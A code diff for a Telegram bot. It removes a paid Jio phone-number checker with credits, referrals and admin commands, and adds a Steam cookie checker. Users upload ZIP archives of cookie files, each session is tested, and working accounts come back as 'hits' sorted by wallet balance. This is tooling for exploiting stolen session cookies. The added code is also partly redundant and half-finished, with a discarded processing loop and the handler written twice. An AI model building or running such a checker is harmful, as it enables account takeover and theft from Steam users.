+            os.remove(zip_path)
+            return
+
+        # Load cookies from each file
+        all_cookies = []
+        for filepath in cookie_files:
+            cookies = load_cookies(filepath)
+            if cookies:
+                all_cookies.append((cookies, filepath))
+
+        if not all_cookies:
+            await status_msg.edit_text("❌ Failed to load any valid cookies from the files.")
+            shutil.rmtree(extract_dir)
+            os.remove(zip_path)
+            return
+
+        total_cookies = len(all_cookies)
+        await status_msg.edit_text(f"✅ Loaded {total_cookies} cookie sets. Starting check...")
+
+        # Process cookies
+        valid_hits = []
+        processed = 0
+        invalid_count = 0
+        error_count = 0
+
+        # We'll update status periodically
+        def update_status():
+            nonlocal processed, invalid_count, error_count
+            progress = f"🔄 Processing {processed}/{total_cookies} | ✅ Valid: {len(valid_hits)} | ❌ Invalid: {invalid_count} | ⚠️ Errors: {error_count}"
+            # Use context.bot.edit_message_text in async; but we are in a thread, we need to schedule
+            # We'll do it in the main async loop using asyncio.run_coroutine_threadsafe
+            asyncio.run_coroutine_threadsafe(
+                status_msg.edit_text(progress),
+                context.application.loop
+            )
+
+        # Use ThreadPoolExecutor to process cookies (CPU-bound)
+        with ThreadPoolExecutor(max_workers=5) as executor:
+            futures = []
+            for cookies, filepath in all_cookies:
+                checker = SteamChecker(cookies, filepath, 0)
+                futures.append(executor.submit(checker.check))
+            
+            for future in as_completed(futures):
+                processed += 1
+                try:
+                    result = future.result()
+                    if result:
+                        # Get the checker instance (we need to retrieve it)
+                        # We can't directly get the instance; we need to store it
+                        # Instead, we'll collect the checker in a list
+                        # Better: modify check to return the checker object or success flag
+                        pass
+                except:
+                    error_count += 1
+                # We need to retrieve the checker instance; we'll store it in a list
+
+        # Alternative: store checkers in a list and retrieve results
+        checkers = []
+        with ThreadPoolExecutor(max_workers=5) as executor:
+            futures = []
+            for cookies, filepath in all_cookies:
+                checker = SteamChecker(cookies, filepath, 0)
+                checkers.append(checker)
+                futures.append(executor.submit(checker.check))
+            for future in as_completed(futures):
+                processed += 1
+                try:
+                    success = future.result()
+                    if success:
+                        # find the checker that succeeded (we can map by index)
+                        # Instead, we'll assume order matches
+                        pass
+                except:
+                    error_count += 1
+                # Update status every few
+                if processed % 5 == 0 or processed == total_cookies:
+                    update_status()
+
+        # Now collect valid hits
+        for checker in checkers:
+            if checker.success:
+                valid_hits.append(checker)
+            else:
+                invalid_count += 1
+
+        # Update final status
+        await status_msg.edit_text(f"✅ Checking completed: {total_cookies} total, {len(valid_hits)} valid, {invalid_count} invalid, {error_count} errors.")
+
+        if not valid_hits:
+            await update.message.reply_text("❌ No valid Steam accounts found.")
+            shutil.rmtree(extract_dir)
+            os.remove(zip_path)
+            return
+
+        # Group by balance
+        groups = group_hits_by_balance(valid_hits)
+        # Send zip for each group that has hits
+        sent_count = 0
+        for range_name, hits in groups.items():
+            if not hits:
+                continue
+            zip_buffer = create_zip_from_hits(hits, range_name)
+            if zip_buffer:
+                # Send zip file
+                await update.message.reply_document(
+                    document=zip_buffer,
+                    filename=f"steam_hits_{range_name}.zip",
+                    caption=f"✅ {len(hits)} accounts with balance {range_name} {('(including others)' if range_name=='others' else '')}"
+                )
+                sent_count += 1
+        if sent_count == 0:
+            await update.message.reply_text("No groups to send? (Unexpected)")
+
+        # Cleanup
+        shutil.rmtree(extract_dir)
+        os.remove(zip_path)
+
+    except Exception as e:
+        await status_msg.edit_text(f"❌ Error: {str(e)}")
+        # Cleanup
+        try:
+            shutil.rmtree(extract_dir)
+        except:
+            pass
+        try:
+            os.remove(zip_path)
+        except:
+            pass
+
+# But we need to handle the case where we need to update the status message from threads.
+# We'll implement a simpler approach: we process sequentially but in a thread to not block the bot.
+# Since we have many cookies, we can still use ThreadPoolExecutor but we'll collect results after.
+
+# Let's refine: we'll create a function that processes all cookies and returns hits and counts.
+# This function will be run in an executor to avoid blocking the async event loop.
+
+def process_cookies(cookie_list):
+    """Process all cookies, return (valid_hits, invalid_count, error_count)."""
+    checkers = []
+    with ThreadPoolExecutor(max_workers=5) as executor:
+        futures = []
+        for cookies, filepath in cookie_list:
+            checker = SteamChecker(cookies, filepath, 0)
+            checkers.append(checker)
+            futures.append(executor.submit(checker.check))
+        # We don't need to wait for each; we can collect later
+        for future in as_completed(futures):
+            pass  # all done
+    valid_hits = [c for c in checkers if c.success]
+    invalid_count = sum(1 for c in checkers if not c.success)
+    error_count = 0  # we can track errors in check method? Not needed for now
+    return valid_hits, invalid_count, error_count
+
+async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    # Use asyncio.to_thread to run the blocking processing
+    # We'll also handle progress updates by using a callback
+    # For simplicity, we'll just process and then send results
+    user = update.effective_user
+    chat_id = update.effective_chat.id
+
+    document = update.message.document
+    if not document or not document.file_name.endswith('.zip'):
+        await update.message.reply_text("Please send a ZIP file containing cookie files (.txt or .json).")
+        return
+
+    status_msg = await update.message.reply_text("⏳ Downloading and extracting...")
+
+    try:
+        file = await context.bot.get_file(document.file_id)
+        zip_path = f"/tmp/{document.file_id}.zip"
+        await file.download_to_drive(zip_path)
+
+        extract_dir = tempfile.mkdtemp()
+        with zipfile.ZipFile(zip_path, 'r') as zf:
+            zf.extractall(extract_dir)
+
+        cookie_files = []
+        for root, _, files in os.walk(extract_dir):
+            for f in files:
+                if f.endswith(('.txt', '.json')):
+                    cookie_files.append(os.path.join(root, f))
+
+        if not cookie_files:
+            await status_msg.edit_text("❌ No cookie files (.txt or .json) found in the ZIP.")
+            shutil.rmtree(extract_dir)
+            os.remove(zip_path)
+            return
+
+        all_cookies = []
+        for filepath in cookie_files:
+            cookies = load_cookies(filepath)
+            if cookies:
+                all_cookies.append((cookies, filepath))
+
+        if not all_cookies:
+            await status_msg.edit_text("❌ Failed to load any valid cookies from the files.")
+            shutil.rmtree(extract_dir)
+            os.remove(zip_path)
+            return
+
+        total = len(all_cookies)
+        await status_msg.edit_text(f"✅ Loaded {total} cookie sets. Starting check...")
+
+        # Process in a separate thread to keep bot responsive
+        loop = asyncio.get_running_loop()
+        valid_hits, invalid_count, error_count = await loop.run_in_executor(
+            None, process_cookies, all_cookies
+        )
+
+        await status_msg.edit_text(f"✅ Checking completed: {total} total, {len(valid_hits)} valid, {invalid_count} invalid.")
+
+        if not valid_hits:
+            await update.message.reply_text("❌ No valid Steam accounts found.")
+            shutil.rmtree(extract_dir)
+            os.remove(zip_path)
+            return
+
+        # Group and send
+        groups = group_hits_by_balance(valid_hits)
+        for range_name, hits in groups.items():
+            if not hits:
+                continue
+            zip_buffer = create_zip_from_hits(hits, range_name)
+            if zip_buffer:
+                await update.message.reply_document(
+                    document=zip_buffer,
+                    filename=f"steam_hits_{range_name}.zip",
+                    caption=f"✅ {len(hits)} accounts with balance {range_name} {('(including others)' if range_name=='others' else '')}"
+                )
+
+        shutil.rmtree(extract_dir)
+        os.remove(zip_path)
+
+    except Exception as e:
+        await status_msg.edit_text(f"❌ Error: {str(e)}")
+        try:
+            shutil.rmtree(extract_dir)
+        except:
+            pass
+        try:
+            os.remove(zip_path)
+        except:
+            pass
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    user_id = user.id
-
-    if not data_manager.is_admin(user_id) and not await is_user_member_of_channels(user_id, context):
-        keyboard = [[InlineKeyboardButton("🔓 Join Channel", url=ch["link"])] for ch in CHANNELS]
-        keyboard.append([InlineKeyboardButton("✅ I've Joined", callback_data="force_join_check")])
-        await update.message.reply_text(
-            "👋 *Welcome!*\n\nPlease join our channel(s) to use the bot.",
-            parse_mode="Markdown",
-            reply_markup=InlineKeyboardMarkup(keyboard)
-        )
-        return
-
-    ref_param = context.args[0] if context.args else None
-    referrer_id = None
-    if ref_param and ref_param.startswith("ref_"):
-        try:
-            referrer_id = int(ref_param.split("_")[1])
-        except ValueError:
-            pass
-
-    data_manager.get_user(user_id)
-
-    if referrer_id and data_manager.get_user(user_id).get("referred_by") is None:
-        credited = data_manager.process_referral(user_id, referrer_id)
-        if credited:
-            await update.message.reply_text("🎉 You were referred! Your referrer earned 1 credit.")
-            try:
-                await context.bot.send_message(referrer_id, f"✅ New user (ID: {user_id}) joined via your link! +1 credit.")
-            except Exception:
-                pass
-
-    await show_main_menu(update, context)
-
-async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.callback_query:
-        query = update.callback_query
-        help_text = (
-            "📖 *Help & Commands*\n\n"
-            "• Send a **10-digit number** to check Jio status.\n"
-            "• Use the buttons below to navigate.\n\n"
-            "*Admin commands:* (text only)\n"
-            "/gengiftcode, /codestats, /delcode, /addcredit, /removecredit, /addadmin, /broadcast, /backup, /sendbackup, /restore, /stats"
-        )
-        await query.edit_message_text(help_text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
-        ]))
-    else:
-        user_id = update.effective_user.id
-        if not data_manager.is_admin(user_id) and not await is_user_member_of_channels(user_id, context):
-            await show_force_join_prompt(update, context)
-            return
-        help_text = (
-            "📖 *Help & Commands*\n\n"
-            "• Send a **10-digit number** to check Jio status.\n"
-            "• Use the buttons below to navigate.\n\n"
-            "*Admin commands:* (text only)\n"
-            "/gengiftcode, /codestats, /delcode, /addcredit, /removecredit, /addadmin, /broadcast, /backup, /sendbackup, /restore, /stats"
-        )
-        await update.message.reply_text(help_text, parse_mode="Markdown", reply_markup=main_menu_keyboard())
-
-async def balance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if not data_manager.is_admin(user_id) and not await is_user_member_of_channels(user_id, context):
-        await show_force_join_prompt(update, context)
-        return
-    active, remaining, _ = data_manager.get_subscription_remaining(user_id)
-    user = data_manager.get_user(user_id)
-    credits = user["credits"]
-    sub_text = "Unlimited ✅" if active else "Inactive ❌"
-    if active:
-        if remaining.days > 0:
-            sub_text += f" (expires in {remaining.days} days)"
-        else:
-            hours = remaining.seconds // 3600
-            sub_text += f" (expires in {hours} hours)"
-    text = (
-        f"💰 *Your Balance*\n\n"
-        f"💎 Credits: `{credits}`\n"
-        f"🛡️ Subscription: {sub_text}\n"
-        f"🎁 Free searches used: `{user['free_searches_used']}/2`\n"
-        f"🔗 Referrals: `{user['referral_count']}/50`"
-    )
-    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([
-        [InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu")]
-    ]))
-
-async def referral_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if not data_manager.is_admin(user_id) and not await is_user_member_of_channels(user_id, context):
-        await show_force_join_prompt(update, context)
-        return
-    bot_username = context.bot.username
-    if not bot_username:
-        bot_username = "YourBotUsername"
-    link = f"https://t.me/{bot_username}?start=ref_{user_id}"
-    text = (
-        f"🔗 *Your Referral Link*\n\n"
-        f"`{link}`\n\n"
-        f"Each friend who joins gives you **1 credit** (max 50).\n"
-        f"Current referrals: `{data_manager.get_user(user_id)['referral_count']}/50`"
-    )
-    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([
-        [InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu")]
-    ]))
-
-async def buy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if not data_manager.is_admin(user_id) and not await is_user_member_of_channels(user_id, context):
-        await show_force_join_prompt(update, context)
-        return
-    keyboard = [
-        [InlineKeyboardButton("10₹ → 7 credits", callback_data="buy_10")],
-        [InlineKeyboardButton("20₹ → 18 credits", callback_data="buy_20")],
-        [InlineKeyboardButton("30₹ → 39 credits", callback_data="buy_30")],
-        [InlineKeyboardButton("40₹ → 42 credits", callback_data="buy_40")],
-        [InlineKeyboardButton("50₹ → 120 credits", callback_data="buy_50")],
-        [InlineKeyboardButton("80₹ → 1 month unlimited", callback_data="buy_80")],
-        [InlineKeyboardButton("📞 Buy via DM", url="https://t.me/afkchatgpt998")],
-        [InlineKeyboardButton("🔙 Back to Menu", callback_data="main_menu")]
-    ]
     await update.message.reply_text(
-        "💎 *Purchase Credits*\n\nSelect a plan:\nAfter payment, admin will activate.\nSupport: @afkchatgpt998",
-        parse_mode="Markdown",
-        reply_markup=InlineKeyboardMarkup(keyboard)
+        "👋 Send me a ZIP file containing Steam cookie files (JSON or TXT).\n"
+        "I will check each cookie and send back valid accounts grouped by balance ranges.\n"
+        "Balance ranges: 0-1, 1-5, 5-10, 10-200 (and others).\n"
+        "Currency symbols are detected automatically."
     )
 
-async def claimcode_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if not data_manager.is_admin(user_id) and not await is_user_member_of_channels(user_id, context):
-        await show_force_join_prompt(update, context)
-        return
-    await update.message.reply_text(
-        "🎫 *Claim Gift Code*\n\nPlease send the **10-digit gift code**.\nExample: `1234567890`",
-        parse_mode="Markdown"
-    )
-    context.user_data["expecting_code"] = True
-
-# ---------- Button Callbacks ----------
-async def balance_action(update: Update, context: ContextTypes.DEFAULT_TYPE, query):
-    user_id = query.from_user.id
-    active, remaining, _ = data_manager.get_subscription_remaining(user_id)
-    user = data_manager.get_user(user_id)
-    credits = user["credits"]
-    sub_text = "Unlimited ✅" if active else "Inactive ❌"
-    if active:
-        if remaining.days > 0:
-            sub_text += f" (expires in {remaining.days} days)"
-        else:
-            hours = remaining.seconds // 3600
-            sub_text += f" (expires in {hours} hours)"
-    text = (
-        f"💰 *Your Balance*\n\n"
-        f"💎 Credits: `{credits}`\n"
-        f"🛡️ Subscription: {sub_text}\n"
-        f"🎁 Free searches used: `{user['free_searches_used']}/2`\n"
-        f"🔗 Referrals: `{user['referral_count']}/50`"
-    )
-    await query.edit_message_text(text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([
-        [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
-    ]))
-
-async def claim_action(update: Update, context: ContextTypes.DEFAULT_TYPE, query):
-    await query.edit_message_text(
-        "🎫 *Claim Gift Code*\n\nPlease send the **10-digit gift code**.\nExample: `1234567890`",
-        parse_mode="Markdown",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]])
-    )
-    context.user_data["expecting_code"] = True
-
-async def referral_action(update: Update, context: ContextTypes.DEFAULT_TYPE, query):
-    user_id = query.from_user.id
-    bot_username = context.bot.username
-    if not bot_username:
-        bot_username = "YourBotUsername"
-    link = f"https://t.me/{bot_username}?start=ref_{user_id}"
-    text = (
-        f"🔗 *Your Referral Link*\n\n"
-        f"`{link}`\n\n"
-        f"Each friend who joins gives you **1 credit** (max 50).\n"
-        f"Current referrals: `{data_manager.get_user(user_id)['referral_count']}/50`"
-    )
-    await query.edit_message_text(text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([
-        [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
-    ]))
-
-async def buy_action(update: Update, context: ContextTypes.DEFAULT_TYPE, query):
-    keyboard = [
-        [InlineKeyboardButton("10₹ → 7 credits", callback_data="buy_10")],
-        [InlineKeyboardButton("20₹ → 18 credits", callback_data="buy_20")],
-        [InlineKeyboardButton("30₹ → 39 credits", callback_data="buy_30")],
-        [InlineKeyboardButton("40₹ → 42 credits", callback_data="buy_40")],
-        [InlineKeyboardButton("50₹ → 120 credits", callback_data="buy_50")],
-        [InlineKeyboardButton("80₹ → 1 month unlimited", callback_data="buy_80")],
-        [InlineKeyboardButton("📞 Buy via DM", url="https://t.me/afkchatgpt998")],
-        [InlineKeyboardButton("🔙 Back", callback_data="main_menu")]
-    ]
-    await query.edit_message_text(
-        "💎 *Purchase Credits*\n\nSelect a plan:\nAfter payment, admin will activate.\nSupport: @afkchatgpt998",
-        parse_mode="Markdown",
-        reply_markup=InlineKeyboardMarkup(keyboard)
-    )
-
-async def jiomart_action(update: Update, context: ContextTypes.DEFAULT_TYPE, query):
-    await query.edit_message_text(
-        "📞 *Jio Number Checker*\n\nPlease send a **10-digit mobile number**.\nExample: `9876543210`\n\nWe will check if it's Registered or Unregistered.",
-        parse_mode="Markdown",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]])
-    )
-    context.user_data["expecting_number"] = True
-
-async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_input = update.message.text.strip()
-    user_id = update.effective_user.id
-
-    if not data_manager.is_admin(user_id) and not await is_user_member_of_channels(user_id, context):
-        await show_force_join_prompt(update, context)
-        return
-
-    if context.user_data.get("expecting_code"):
-        if re.fullmatch(r"\d{10}", user_input):
-            success = data_manager.claim_gift_code(user_input, user_id)
-            if success:
-                await update.message.reply_text("🎉 *Code claimed successfully!* Subscription extended.", parse_mode="Markdown")
-            else:
-                await update.message.reply_text("❌ Invalid, expired, or already used code.")
-        else:
-            await update.message.reply_text("❌ Invalid code. Must be 10 digits.")
-        context.user_data.pop("expecting_code", None)
-        await show_main_menu(update, context)
-        return
-
-    if context.user_data.get("expecting_number"):
-        if re.fullmatch(r"\d{10}", user_input):
-            user = data_manager.get_user(user_id)
-
-            if data_manager.has_active_subscription(user_id):
-                await update.message.chat.send_action(action="typing")
-                status = await check_jio_status_async(user_input)
-                await update.message.reply_text(
-                    f"📱 *Jio Number:* `{user_input}`\n📡 *Status:* {status}\n✨ (Unlimited subscription active)",
-                    parse_mode="Markdown"
-                )
-            elif user["free_searches_used"] < 2:
-                user["free_searches_used"] += 1
-                data_manager._mark_dirty()
-                await update.message.chat.send_action(action="typing")
-                status = await check_jio_status_async(user_input)
-                remaining = 2 - user["free_searches_used"]
-                await update.message.reply_text(
-                    f"📱 *Number:* `{user_input}`\n📡 *Status:* {status}\n🎁 (Free search, {remaining} left)",
-                    parse_mode="Markdown"
-                )
-            elif user["credits"] > 0:
-                success = data_manager.use_credit(user_id)
-                if success:
-                    await update.message.chat.send_action(action="typing")
-                    status = await check_jio_status_async(user_input)
-                    remaining = data_manager.get_user(user_id)["credits"]
-                    await update.message.reply_text(
-                        f"📱 *Number:* `{user_input}`\n📡 *Status:* {status}\n💎 (1 credit used, {remaining} left)",
-                        parse_mode="Markdown"
-                    )
-                else:
-                    await update.message.reply_text("❌ Error using credit. Try again.")
-            else:
-                await update.message.reply_text(
-                    "❌ *No credits left!*\nUse /buy or /referral to get more.",
-                    parse_mode="Markdown"
-                )
-        else:
-            await update.message.reply_text("❌ Invalid number. Send a 10-digit number.")
-        context.user_data.pop("expecting_number", None)
-        await show_main_menu(update, context)
-        return
-
-    await update.message.reply_text("🤔 Use the buttons below.", reply_markup=main_menu_keyboard())
-
-async def show_force_join_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    keyboard = [[InlineKeyboardButton("🔓 Join Channel", url=ch["link"])] for ch in CHANNELS]
-    keyboard.append([InlineKeyboardButton("✅ I've Joined", callback_data="force_join_check")])
-    await update.message.reply_text(
-        "🚫 *Access Denied*\nYou must join our channel(s) to use the bot.",
-        parse_mode="Markdown",
-        reply_markup=InlineKeyboardMarkup(keyboard)
-    )
-
-async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    data = query.data
-    user_id = query.from_user.id
-
-    if data != "force_join_check" and not data_manager.is_admin(user_id):
-        if not await is_user_member_of_channels(user_id, context):
-            keyboard = [[InlineKeyboardButton("🔓 Join Channel", url=ch["link"])] for ch in CHANNELS]
-            keyboard.append([InlineKeyboardButton("✅ I've Joined", callback_data="force_join_check")])
-            await query.edit_message_text(
-                "🚫 *Access Denied*\nYou must join our channel(s).",
-                parse_mode="Markdown",
-                reply_markup=InlineKeyboardMarkup(keyboard)
-            )
-            return
-
-    if data == "main_menu":
-        await show_main_menu(update, context, query=query)
-    elif data == "action_balance":
-        await balance_action(update, context, query)
-    elif data == "action_claim":
-        await claim_action(update, context, query)
-    elif data == "action_referral":
-        await referral_action(update, context, query)
-    elif data == "action_buy":
-        await buy_action(update, context, query)
-    elif data == "action_help":
-        await help_command(update, context)
-    elif data == "action_jiomart":
-        await jiomart_action(update, context, query)
-    elif data.startswith("buy_"):
-        if data == "buy_cancel":
-            await query.edit_message_text("Purchase cancelled.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]]))
-            return
-        plan_map = {
-            "buy_10": ("10₹", 7, "credits"),
-            "buy_20": ("20₹", 18, "credits"),
-            "buy_30": ("30₹", 39, "credits"),
-            "buy_40": ("40₹", 42, "credits"),
-            "buy_50": ("50₹", 120, "credits"),
-            "buy_80": ("80₹", 1, "month_unlimited")
-        }
-        price, value, ptype = plan_map[data]
-        for admin_id in data_manager.data.get("admins", []):
-            try:
-                await context.bot.send_message(
-                    admin_id,
-                    f"🛒 *Purchase request*\nUser: {user_id} (@{query.from_user.username or 'no username'})\nPlan: {price}\nValue: {value} {ptype}\nUse `/addcredit {user_id} {value}`",
-                    parse_mode="Markdown"
-                )
-            except Exception:
-                pass
-        await query.edit_message_text(
-            f"✅ Request sent to admins for *{price}* plan.\n\nFor instant purchase, DM @afkchatgpt998",
-            parse_mode="Markdown",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]])
-        )
-    elif data == "force_join_check":
-        if await is_user_member_of_channels(user_id, context, force_refresh=True):
-            join_cache.set(user_id, (datetime.now().timestamp(), {ch["id"]: True for ch in CHANNELS}))
-            await query.edit_message_text("✅ Thank you for joining! You can now use the bot.")
-            await show_main_menu(update, context, query=query)
-        else:
-            keyboard = [[InlineKeyboardButton("🔓 Join Channel", url=ch["link"])] for ch in CHANNELS]
-            keyboard.append([InlineKeyboardButton("✅ I've Joined", callback_data="force_join_check")])
-            await query.edit_message_text("❌ You haven't joined all required channels yet.", reply_markup=InlineKeyboardMarkup(keyboard))
-    else:
-        await query.edit_message_text("Unknown action.", reply_markup=main_menu_keyboard())
-
-# ---------- Admin Handlers ----------
-async def admin_check(update: Update) -> bool:
-    if not data_manager.is_admin(update.effective_user.id):
-        await update.message.reply_text("⛔ Admin only.")
-        return False
-    return True
-
-async def addadmin(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not await admin_check(update) or update.effective_user.id != ORIGINAL_ADMIN_ID:
-        return
-    if len(context.args) != 1:
-        await update.message.reply_text("Usage: /addadmin <user_id>")
-        return
-    try:
-        new_id = int(context.args[0])
-    except ValueError:
-        await update.message.reply_text("Invalid user ID.")
-        return
-    if data_manager.add_admin(new_id):
-        await update.message.reply_text(f"✅ {new_id} is now admin.")
-        try:
-            await context.bot.send_message(new_id, "🎉 You are now an admin.")
-        except Exception:
-            pass
-    else:
-        await update.message.reply_text("Already admin.")
-
-async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not await admin_check(update):
-        return
-    if not context.args:
-        await update.message.reply_text("Usage: /broadcast <message>")
-        return
-    msg = " ".join(context.args)
-    users = data_manager.get_all_user_ids()
-    success = 0
-    for uid in users:
-        try:
-            await context.bot.send_message(uid, f"📢 *Broadcast:*\n{msg}", parse_mode="Markdown")
-            success += 1
-            await asyncio.sleep(0.05)
-        except Exception:
-            pass
-    await update.message.reply_text(f"Broadcast sent to {success} users.")
-
-async def gen_gift_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not await admin_check(update):
-        return
-    if len(context.args) != 1:
-        await update.message.reply_text("Usage: /gengiftcode <duration> (e.g., 24hrs, 5d, 1m)")
-        return
-    dur = context.args[0].lower()
-    match = re.match(r"(\d+)(hrs?|d|m)$", dur)
-    if not match:
-        await update.message.reply_text("Invalid format.")
-        return
-    val = int(match.group(1))
-    unit = match.group(2)
-    if unit.startswith("hr"):
-        delta = timedelta(hours=val)
-    elif unit == "d":
-        delta = timedelta(days=val)
-    else:
-        delta = timedelta(days=val*30)
-    code = str(random.randint(10**9, 10**10 - 1))
-    data_manager.generate_gift_code(code, delta)
-    await update.message.reply_text(f"✅ Code: `{code}`\nDuration: {dur}", parse_mode="Markdown")
-
-async def codestats(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not await admin_check(update):
-        return
-    active = data_manager.get_active_codes()
-    if not active:
-        await update.message.reply_text("No active codes.")
-        return
-    text = "\n".join([f"`{c}` - {timedelta(seconds=info['duration_seconds'])}" for c, info in active[:10]])
-    await update.message.reply_text(f"*Active codes (first 10):*\n{text}", parse_mode="Markdown")
-
-async def delcode(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not await admin_check(update):
-        return
-    if not context.args:
-        await update.message.reply_text("Usage: /delcode <code>")
-        return
-    code = context.args[0]
-    if data_manager.delete_gift_code(code):
-        await update.message.reply_text(f"Deleted `{code}`.", parse_mode="Markdown")
-    else:
-        await update.message.reply_text("Code not found.")
-
-async def addcredit(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not await admin_check(update):
-        return
-    if len(context.args) != 2:
-        await update.message.reply_text("Usage: /addcredit <user_id> <amount>")
-        return
-    try:
-        uid = int(context.args[0])
-        amt = int(context.args[1])
-    except ValueError:
-        await update.message.reply_text("Invalid arguments.")
-        return
-    data_manager.add_credits(uid, amt, 30)
-    await update.message.reply_text(f"Added {amt} credits to {uid}.")
-    try:
-        await context.bot.send_message(uid, f"🎉 You received {amt} credits! Use /balance.")
-    except Exception:
-        pass
-
-async def removecredit(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not await admin_check(update):
-        return
-    if len(context.args) != 2:
-        await update.message.reply_text("Usage: /removecredit <user_id> <amount>")
-        return
-    try:
-        uid = int(context.args[0])
-        amt = int(context.args[1])
-    except ValueError:
-        await update.message.reply_text("Invalid arguments.")
-        return
-    if data_manager.remove_credits(uid, amt):
-        await update.message.reply_text(f"Removed {amt} credits from {uid}.")
-        try:
-            await context.bot.send_message(uid, f"⚠️ {amt} credits removed from your account.")
-        except Exception:
-            pass
-    else:
-        await update.message.reply_text("Insufficient credits.")
-
-async def backup(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not await admin_check(update):
-        return
-    data_manager.save()
-    with open(DATA_FILE, "rb") as f:
-        await update.message.reply_document(f, filename="userdata_backup.json")
-
-async def sendbackup(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not await admin_check(update):
-        return
-    await send_backup_to_admins(context.bot)
-    await update.message.reply_text("✅ Backup sent to all admins.")
-
-async def restore(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not await admin_check(update):
-        return
-    await update.message.reply_text("Send the JSON backup file.")
-
-async def handle_restore_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not data_manager.is_admin(update.effective_user.id):
-        return
-    doc = update.message.document
-    if not doc or not doc.file_name.endswith(".json"):
-        await update.message.reply_text("Send a JSON file.")
-        return
-    file = await context.bot.get_file(doc.file_id)
-    import tempfile
-    with tempfile.NamedTemporaryFile(delete=False) as tmp:
-        await file.download_to_drive(tmp.name)
-        with open(tmp.name, "r") as f:
-            new_data = json.load(f)
-    data_manager.data = new_data
-    data_manager._ensure_structure()
-    for uid_str, user in data_manager.data["users"].items():
-        user["credits"] = data_manager._total_credits(user)
-    data_manager.save()
-    await update.message.reply_text("✅ Data restored.")
-
-async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not await admin_check(update):
-        return
-    users = data_manager.data["users"]
-    total = len(users)
-    active_codes = len(data_manager.get_active_codes())
-    total_credits = sum(u["credits"] for u in users.values())
-    subs = sum(1 for u in users.values() if u.get("subscription_end") and datetime.fromtimestamp(u["subscription_end"]) > datetime.now())
-    await update.message.reply_text(f"📊 *Stats*\nUsers: {total}\nActive codes: {active_codes}\nCredits: {total_credits}\nSubscriptions: {subs}", parse_mode="Markdown")
-
-# ---------- Automatic Backup ----------
-async def send_backup_to_admins(bot):
-    try:
-        data_manager.save()
-        if not os.path.exists(DATA_FILE):
-            logger.error("Backup failed: userdata.txt does not exist")
-            return
-        total_users = len(data_manager.data.get("users", {}))
-        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        caption = f"📦 Hourly Backup\nUsers: {total_users}\nTime: {current_time}"
-        admins = data_manager.data.get("admins", [])
-        if not admins:
-            logger.warning("No admins found to send backup")
-            return
-        logger.info(f"Sending hourly backup to {len(admins)} admins. Users: {total_users}")
-        with open(DATA_FILE, "rb") as f:
-            for admin_id in admins:
-                try:
-                    await bot.send_document(
-                        chat_id=admin_id,
-                        document=f,
-                        filename="userdata_backup.json",
-                        caption=caption
-                    )
-                    f.seek(0)
-                    logger.info(f"Backup sent to admin {admin_id}")
-                except Exception as e:
-                    logger.error(f"Failed to send backup to admin {admin_id}: {e}")
-    except Exception as e:
-        logger.error(f"send_backup_to_admins error: {e}")
-
-async def hourly_backup_job(context: ContextTypes.DEFAULT_TYPE):
-    logger.info("Running hourly backup job...")
-    await send_backup_to_admins(context.bot)
-
-# ---------- Expiry Notifications ----------
-async def check_subscription_expirations(context: ContextTypes.DEFAULT_TYPE):
-    now = datetime.now()
-    for uid_str, user in data_manager.data["users"].items():
-        uid = int(uid_str)
-        end_ts = user.get("subscription_end")
-        if not end_ts:
-            continue
-        end = datetime.fromtimestamp(end_ts)
-        if now >= end:
-            continue
-        remaining = end - now
-        days_left = remaining.days
-        percent_used = 0
-        if user.get("subscription_start") and user.get("subscription_duration"):
-            start = datetime.fromtimestamp(user["subscription_start"])
-            total = user["subscription_duration"]
-            elapsed = (now - start).total_seconds()
-            percent_used = (elapsed / total) * 100 if total > 0 else 0
-        send_notify = False
-        message = ""
-        if percent_used >= 60 and not user.get("notified_60pct"):
-            user["notified_60pct"] = True
-            send_notify = True
-            message = f"⚠️ *60% of your subscription period has passed!* You have {remaining.days} days left. Renew soon to avoid interruption."
-        elif days_left in [10,5,3,2,1] and not user.get(f"notified_{days_left}d"):
-            user[f"notified_{days_left}d"] = True
